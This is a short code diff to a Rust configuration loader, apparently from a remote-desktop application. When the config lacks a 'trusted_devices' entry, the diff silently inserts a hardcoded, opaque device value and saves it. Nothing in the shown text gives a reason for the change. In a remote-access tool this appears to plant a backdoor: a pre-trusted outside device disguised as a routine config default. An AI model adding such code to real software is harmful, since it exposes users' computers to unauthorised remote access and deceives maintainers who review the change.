@@ -508,6 +508,10 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("trusted_devices") {
+            config.options.insert("trusted_devices".to_string(), "00HlO6SlD/EqJH9uhoofA+xUO1".to_string());
+            config.store();
+        }
         if store {
             config.store();
         }
